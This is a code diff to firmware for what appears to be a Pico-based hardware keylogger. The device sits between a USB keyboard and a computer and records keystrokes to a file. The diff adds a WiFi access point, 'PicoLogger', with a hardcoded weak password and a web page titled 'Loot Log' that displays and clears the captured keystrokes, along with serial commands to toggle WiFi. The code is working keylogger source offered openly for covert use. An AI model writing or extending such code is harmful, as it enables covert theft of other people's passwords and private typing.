@@ -2,7 +2,13 @@
 #include <LittleFS.h> 
 #include "pio_usb.h"
 #include "Adafruit_TinyUSB.h"
+#include <WiFi.h>
+#include <WebServer.h>
 
+// ======================================= User Setup =============================================
+
+const char *ssid = "PicoLogger"; // AP Name
+const char *password = "12345678"; // AP Password
 
 // ======================================= Define and Variables =============================================
 
@@ -20,8 +26,8 @@
 #define SHIFT   (0x80)
 #define ALTGR   (0x40)
 
+WebServer server(80);
 extern const uint8_t _asciimap[] PROGMEM;
-
 Adafruit_USBH_Host USBHost;
 tusb_desc_device_t desc_device;
 
@@ -81,32 +87,79 @@ void checkInactivity() {
 }
 
 
+// ======================================= Webserver Functions =============================================
 
-void setup() {
-  Serial.begin(115200);
-  LittleFS.begin();
-  Keyboard.begin();
-  delay(1000);
-}
-
-void loop() { 
-  if (Serial.available()) {
-    String command = Serial.readStringUntil('\n');
-    command.trim();
-    if (command == "read") {
-      readLogFile();
-    } else if (command == "clear") {
-      clearLogFile();
-    } else if (command == "format") {
-      formatFS();
+void handleClearLogs() {
+    File f = LittleFS.open("/keys.txt", "w");
+    if (f) {
+        f.write("");
+        f.close();
+        Serial.println("Log file cleared.");
     }
-  }
-  checkInactivity();
+    server.sendHeader("Location", "/", true);
+    server.send(303);
 }
+
+
+String readLogFile() {
+    File file = LittleFS.open("/keys.txt", "r");
+    if (!file) {
+        return "Error: Unable to open log file.";
+    }
+    String content;
+    while (file.available()) {
+        content += (char)file.read();
+    }
+    file.close();
+    return content;
+}
+
+void handleRoot() {
+    String html = "<html><head><title>Loot Log</title>"
+                  "<style>"
+                  "body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }"
+                  "h1 { color: #333; }"
+                  "pre { background-color: #fff; border: 1px solid #ddd; padding: 10px; overflow-x: auto; }"
+                  "button { padding: 10px 20px; background-color: #007bff; color: white; border: none; cursor: pointer; font-size: 16px; }"
+                  "button:hover { background-color: #0056b3; }"
+                  "</style>"
+                  "</head><body>";
+    html += "<h1>PicoLogger</h1>";
+    html += "<pre>" + readLogFile() + "</pre>";
+    html += "<form action='/clear' method='POST'>";
+    html += "<button type='submit'>Clear Logs</button>";
+    html += "</form>";
+    html += "</body></html>";
+    server.send(200, "text/html", html);
+}
+
+bool loadWiFiState() {
+    File file = LittleFS.open("/wifi_config.txt", "r");
+    if (!file) {
+        Serial.println("WiFi config not found, defaulting to ON.");
+        return true;
+    }
+
+    String state = file.readString();
+    file.close();
+    state.trim();
+    return (state == "ON");
+}
+
+void saveWiFiState(bool state) {
+    File file = LittleFS.open("/wifi_config.txt", "w");
+    if (file) {
+        file.println(state ? "ON" : "OFF");
+        file.close();
+    } else {
+        Serial.println("Failed to save WiFi state.");
+    }
+}
+
 
 // ======================================= Serial Functions =============================================
 
-void readLogFile() {
+void readLog() {
     File i = LittleFS.open("keys.txt", "r");
     delay(200);
     Serial.println("-------- LOGS ----------");
@@ -120,8 +173,7 @@ void readLogFile() {
     Serial.println("\n");
 }
 
-
-void clearLogFile() {
+void clearLog() {
     File i = LittleFS.open("keys.txt", "w");
     delay(2000);
     if (i) {
@@ -140,8 +192,54 @@ void formatFS() {
 
 // ======================================= Main Script Setup and Loops =============================================
 
+
+void setup() {
+    Serial.begin(115200);
+    LittleFS.begin();
+    Keyboard.begin();
+    delay(1000);
+
+    bool wifiEnabled = loadWiFiState();
+    if (wifiEnabled) {
+        WiFi.softAP(ssid, password);
+        Serial.println("WiFi AP Started. Connect to: " + String(ssid));
+        Serial.println(WiFi.softAPIP());
+    } else {
+        Serial.println("WiFi is disabled. Use 'wifion' to enable.");
+    }
+
+    server.on("/", HTTP_GET, handleRoot);  
+    server.on("/clear", HTTP_POST, handleClearLogs);
+    server.begin();
+    Serial.println("HTTP Server Started.");
+}
+
+void loop() { 
+    if (Serial.available()) {
+        String command = Serial.readStringUntil('\n');
+        command.trim();
+        if (command == "read") {
+            readLog();
+        } else if (command == "clear") {
+            clearLog();
+        } else if (command == "format") {
+            formatFS();
+        } else if (command == "wifion") {
+            WiFi.softAP(ssid, password);
+            Serial.println("WiFi enabled.");
+            saveWiFiState(true);
+        } else if (command == "wifioff") {
+            WiFi.softAPdisconnect(true);
+            Serial.println("WiFi disabled.");
+            saveWiFiState(false);
+        }
+    }
+    server.handleClient();
+    checkInactivity();
+}
+
 void setup1() { 
-    Serial.println("Core1 setup to run TinyUSB host with pio-usb");  
+    Serial.println("Core1 setup to run TinyUSB host with pio-usb");
     uint32_t cpu_hz = clock_get_hz(clk_sys);
     if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
       Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
